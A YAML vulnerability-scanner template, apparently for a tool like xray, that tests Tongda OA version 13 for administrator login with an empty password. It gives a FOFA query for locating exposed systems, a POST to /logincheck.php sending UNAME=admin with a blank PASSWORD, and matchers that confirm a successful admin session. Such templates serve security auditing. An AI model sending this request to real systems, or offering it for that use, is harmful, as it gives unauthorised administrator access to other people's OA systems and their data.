id: poc-yaml-tongda-13-logincheck-empty-password
info:
  name: 通达OA 13版本空密码登录漏洞
  severity: medium
  tags:
  - 弱口令
  finger: 通达OA
  fofa: app="TDXK-通达OA"
requests:
- method: POST
  path: /logincheck.php
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: UNAME=admin&PASSWORD=
  expression: "status_code == 200 && \ncontains(title,\"系统登录\") &&\ncontains(body,`location=\"\
    ./general/\"`) && (\ncontains(gbk_decode(body),`正在进入OA系统，请稍候...`) || contains(body,`正在进入OA系统，请稍候...`)\
    \ )&&\ncontains(headers,\"USER_NAME_COOKIE=admin\")\n"
variables: {}
transport: http
